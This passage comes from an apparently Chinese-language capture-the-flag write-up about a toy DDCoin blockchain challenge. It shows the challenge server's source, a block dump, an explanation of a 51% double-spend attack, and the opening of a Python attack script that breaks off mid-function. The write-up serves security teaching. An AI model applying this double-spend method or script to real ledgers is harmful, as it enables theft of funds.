punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">create_tx_and_check_shop_balance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    init<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        block <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        append_block<span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">,</span> DIFFICULTY<span class=\"token punctuation\">)</span>\n        msg <span class=\"token operator\">=</span> <span class=\"token string\">'transaction finished.'</span>\n    <span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span>\n        \n    balance<span class=\"token punctuation\">,</span> utxos<span class=\"token punctuation\">,</span> tail <span class=\"token operator\">=</span> get_balance_of_all<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> balance<span class=\"token punctuation\">[</span>shop_address<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1000000</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># when 1000000 DDCoins are received, the shop will give you a diamond</span>\n        session<span class=\"token punctuation\">[</span><span class=\"token string\">'your_diamonds'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n        <span class=\"token comment\"># and immediately the shop will store the money somewhere safe.</span>\n        transferred <span class=\"token operator\">=</span> transfer<span class=\"token punctuation\">(</span>utxos<span class=\"token punctuation\">,</span> shop_address<span class=\"token punctuation\">,</span> shop_wallet_address<span class=\"token punctuation\">,</span> balance<span class=\"token punctuation\">[</span>shop_address<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> shop_privkey<span class=\"token punctuation\">)</span>\n        new_block <span class=\"token operator\">=</span> create_block<span class=\"token punctuation\">(</span>tail<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'save the DDCoins in a cold wallet'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>transferred<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        append_block<span class=\"token punctuation\">(</span>new_block<span class=\"token punctuation\">)</span>\n        msg <span class=\"token operator\">+=</span> <span class=\"token string\">' You receive a diamond.'</span>\n    <span class=\"token keyword\">return</span> msg\n    \n        \n<span class=\"token comment\"># if you mess up the blockchain, use this to reset the blockchain.</span>\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span>url_prefix<span class=\"token operator\">+</span><span class=\"token string\">'/reset'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">reset_blockchain</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token string\">'blocks'</span> <span class=\"token keyword\">in</span> session<span class=\"token punctuation\">:</span> <span class=\"token keyword\">del</span> session<span class=\"token punctuation\">[</span><span class=\"token string\">'blocks'</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">if</span> <span class=\"token string\">'genesis_block_hash'</span> <span class=\"token keyword\">in</span> session<span class=\"token punctuation\">:</span> <span class=\"token keyword\">del</span> session<span class=\"token punctuation\">[</span><span class=\"token string\">'genesis_block_hash'</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">'reset.'</span>\n    \n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span>url_prefix<span class=\"token operator\">+</span><span class=\"token string\">'/source_code'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">show_source_code</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    source <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'serve.py'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span>\n    html <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> source<span class=\"token punctuation\">:</span>\n        html <span class=\"token operator\">+=</span> line<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'&amp;'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'&amp;amp;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'\\t'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'&amp;nbsp;'</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'&amp;nbsp;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'&amp;lt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'&amp;gt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'&lt;br />'</span><span class=\"token punctuation\">)</span>\n    source<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> html\n    \n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>debug<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> host<span class=\"token operator\">=</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Block-json\"><a href=\"#Block-json\" class=\"headerlink\" title=\"Block.json\"></a>Block.json</h3><pre class=\"line-numbers language-json\" data-language=\"json\"><code class=\"language-json\">Announcement<span class=\"token operator\">:</span> The server has been restarted at <span class=\"token number\">21</span><span class=\"token operator\">:</span> <span class=\"token number\">45</span> <span class=\"token number\">04</span>/<span class=\"token number\">17</span>. All blockchain have been reset. View source code\n\nhash of genesis block<span class=\"token operator\">:</span> be640671a52952b2131db45c57d47546981ff5f147be0bbd635a3ddc84223875\n\nthe bank's addr<span class=\"token operator\">:</span> 82f4388efc72da6dc0b3f2de97f71b08f75d884c84a13fe65c4e8fab520c9f28ca88541f96180a0740490ac4785091a1<span class=\"token punctuation\">,</span>\nthe hacker's addr<span class=\"token operator\">:</span> abf5835cbc5365bbcca88fd5b42d206da37819e55c9a8f82483b691b81994c9013d9d5972cd7a65a0a96bcf6f070858b<span class=\"token punctuation\">,</span> \nthe shop's addr<span class=\"token operator\">:</span> 89bd78fab0d0340fa22af91cd104a07d4725f8b0296e49abe939fed47b12940b5f2c1a70e22a5a8d38c119916b8cd545\n\nBalance of all addresses<span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">\"89bd78fab0d0340fa22af91cd104a07d4725f8b0296e49abe939fed47b12940b5f2c1a70e22a5a8d38c119916b8cd545\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"abf5835cbc5365bbcca88fd5b42d206da37819e55c9a8f82483b691b81994c9013d9d5972cd7a65a0a96bcf6f070858b\"</span><span class=\"token operator\">:</span> <span class=\"token number\">999999</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"82f4388efc72da6dc0b3f2de97f71b08f75d884c84a13fe65c4e8fab520c9f28ca88541f96180a0740490ac4785091a1\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span>\n<span class=\"token punctuation\">&#125;</span>\n\nAll utxos<span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">\"0ff9dfa0-a54a-4178-bfec-08ffe5b8b563\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token property\">\"amount\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"hash\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"7214dfcf889839edcc6f62a45a5dc7f6facee8d07770076a47066cfa31284e56\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"addr\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"82f4388efc72da6dc0b3f2de97f71b08f75d884c84a13fe65c4e8fab520c9f28ca88541f96180a0740490ac4785091a1\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"0ff9dfa0-a54a-4178-bfec-08ffe5b8b563\"</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"7637e88e-f204-4218-a06f-e9d7bac7c83f\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token property\">\"amount\"</span><span class=\"token operator\">:</span> <span class=\"token number\">999999</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"hash\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"812d25d4353dbd4fe577f95bd0e2b9c025e869fda429bafaef29e905ab057b21\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"addr\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"abf5835cbc5365bbcca88fd5b42d206da37819e55c9a8f82483b691b81994c9013d9d5972cd7a65a0a96bcf6f070858b\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"7637e88e-f204-4218-a06f-e9d7bac7c83f\"</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\nBlockchain Explorer<span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">\"5b6c21275843991fc5ecd900c147a5f1a593d0ee5aebda4739ecca8866bcf990\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token property\">\"nonce\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"a empty block\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"prev\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"126122810f9b8807bec1d52f999ca960117eeb4ddc02d8299ba914840bc39e7b\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"hash\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"5b6c21275843991fc5ecd900c147a5f1a593d0ee5aebda4739ecca8866bcf990\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"transactions\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"height\"</span><span class=\"token operator\">:</span> <span class=\"token number\">2</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"126122810f9b8807bec1d52f999ca960117eeb4ddc02d8299ba914840bc39e7b\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token property\">\"nonce\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"HAHA, I AM THE BANK NOW!\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"prev\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"be640671a52952b2131db45c57d47546981ff5f147be0bbd635a3ddc84223875\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"hash\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"126122810f9b8807bec1d52f999ca960117eeb4ddc02d8299ba914840bc39e7b\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"transactions\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token property\">\"input\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token string\">\"c9dd4f71-a9dc-4e78-b32c-2800ec131fcd\"</span>\n                <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"signature\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token string\">\"1d16f161e44e4b38cef33f67da0bb9a22f72033304150051d4c31b0d6dc23a0ae698da5ebca3df26e555bb0d2a9ba0ef\"</span>\n                <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"hash\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"5079bfd8fa1742a45d08f0be78ca9d79fd4785418c9e66e7857d62d451779a69\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"output\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token property\">\"amount\"</span><span class=\"token operator\">:</span> <span class=\"token number\">999999</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"hash\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"812d25d4353dbd4fe577f95bd0e2b9c025e869fda429bafaef29e905ab057b21\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"addr\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"abf5835cbc5365bbcca88fd5b42d206da37819e55c9a8f82483b691b81994c9013d9d5972cd7a65a0a96bcf6f070858b\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"7637e88e-f204-4218-a06f-e9d7bac7c83f\"</span>\n                    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token property\">\"amount\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"hash\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"7214dfcf889839edcc6f62a45a5dc7f6facee8d07770076a47066cfa31284e56\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"addr\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"82f4388efc72da6dc0b3f2de97f71b08f75d884c84a13fe65c4e8fab520c9f28ca88541f96180a0740490ac4785091a1\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"0ff9dfa0-a54a-4178-bfec-08ffe5b8b563\"</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"height\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"be640671a52952b2131db45c57d47546981ff5f147be0bbd635a3ddc84223875\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token property\">\"nonce\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"The Times 03/Jan/2009 Chancellor on brink of second bailout for bank\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"prev\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"0000000000000000000000000000000000000000000000000000000000000000\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"hash\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"be640671a52952b2131db45c57d47546981ff5f147be0bbd635a3ddc84223875\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"transactions\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token property\">\"input\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"signature\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"hash\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"7cfc30daec2db89d15fa54cea31d2e4c8dc6338b9f48744d49fc6dd98470ddaa\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"output\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token property\">\"amount\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1000000</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"hash\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"0533f20dcd461947c6491b460e3b21d9bd7ad7a9a9202e28b66085b71c6fe64c\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"addr\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"82f4388efc72da6dc0b3f2de97f71b08f75d884c84a13fe65c4e8fab520c9f28ca88541f96180a0740490ac4785091a1\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"c9dd4f71-a9dc-4e78-b32c-2800ec131fcd\"</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"height\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"0x03-analyse\"><a href=\"#0x03-analyse\" class=\"headerlink\" title=\"0x03 analyse\"></a>0x03 analyse</h1><p>初探公链安全，这道题带来的感觉还是很有难度的</p>\n<p>首先来分析一下serve.py的源码，可以构造出如下的一个区块链结构<img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/518251669895986_.pic_hd.jpg\"></p>\n<p>题目要求了获得两颗钻石，100w一颗，但是总共发行了100w DDCoin并且还有99w被黑客转走，所以我们需要需要通过双花来实现token多次花费，购买两个钻石，这也就涉及到51%攻击</p>\n<p>51%攻击，在区块链系统之下，矿工只认定最长的那一条区块链，所以如果有一名恶意矿工，拥有全网一半以上的算力，那么他就有更大的概率计算出下一个区块，进而构造出更长的一条区块链，回滚上一条区块的交易，实现货币的二次花费</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/1831669897116_.pic_hd.jpg\"></p>\n<p>如上图，黑客进行了花费之后，分叉出一个新的区块，并且快速计算出下一个区块，构建成一个更长的区块链，则花费区块作废，余额回滚至花费之前。</p>\n<p>这道题已经说了，全部矿机已经宕机，所以我们拥有100%的算力，进行两次分叉即可购买两颗钻石</p>\n<p>所以我们如下图构造</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/1841669907379_.pic_hd.jpg\"></p>\n<p>清楚了怎么利用51攻击，再次审计使用python实现的blockchain，给出了append_block函数，我们可以像指定区块后添加下一个区块，所以只需要构建我们的攻击区块，实现更长的区块链即可（每次在前端页面创建新的交易会增加区块，同时判断shop时候获得100w ddcoins同时在下一个区块转走这笔钱）</p>\n<h1 id=\"0x04-Attack\"><a href=\"#0x04-Attack\" class=\"headerlink\" title=\"0x04 Attack\"></a>0x04 Attack</h1><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> functools <span class=\"token keyword\">import</span> <span class=\"token builtin\">reduce</span>\n<span class=\"token keyword\">import</span> hashlib<span class=\"token punctuation\">,</span> json<span class=\"token punctuation\">,</span> rsa<span class=\"token punctuation\">,</span> uuid<span class=\"token punctuation\">,</span> os\n<span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">,</span> redirect<span class=\"token punctuation\">,</span> url_for<span class=\"token punctuation\">,</span> escape<span class=\"token punctuation\">,</span> request\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> uuid\n\nEMPTY_HASH <span class=\"token operator\">=</span> <span class=\"token string\">'0'</span> <span class=\"token operator\">*</span> <span class=\"token number\">64</span>\nDIFFICULTY <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token string\">'00000'</span> <span class=\"token operator\">+</span> <span class=\"token string\">'f'</span> <span class=\"token operator\">*</span> <span class=\"token number\">59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://127.0.0.1:9999/b9ca5f959dd7e/\"</span>\nr <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">)</span>\nsession1 <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'Set-Cookie'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\ncookies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"session\"</span><span class=\"token punctuation\">:</span> session1<span class=\"token punctuation\">&#125;</span>\nreq <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span>cookies<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n\ngenesis_block<span class=\"token operator\">=</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"genesis block:\"</span><span class=\"token punctuation\">)</span>\nshop_addr<span class=\"token operator\">=</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"shop address:\"</span><span class=\"token punctuation\">)</span>\nINPUT<span class=\"token operator\">=</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"INPUT ID:\"</span><span class=\"token punctuation\">)</span>\nSIGNATURE<span class=\"token operator\">=</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sigature:\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">hash</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span>hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n \n<span class=\"token keyword\">def</span> <span class=\"token function\">hash_reducer</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n \n<span class=\"token keyword\">def</span> <span class=\"token function\">hash_block</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">reduce</span><span class=\"token punctuation\">(</span>hash_reducer<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>block<span class=\"token punctuation\">[</span><span class=\"token string\">'prev'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> block<span class=\"token punctuation\">[</span><span class=\"token string\">'nonce'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">reduce</span><span class=\"token punctuation\">(</span>hash_reducer<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>tx<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> tx <span class=\"token keyword\">in</span> block<span class=\"token punctuation\">[</span><span class=\"token string\">'transactions'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> EMPTY_HASH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n \n<span class=\"token keyword\">def</span> <span class=\"token function\">hash_utxo</span><span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token 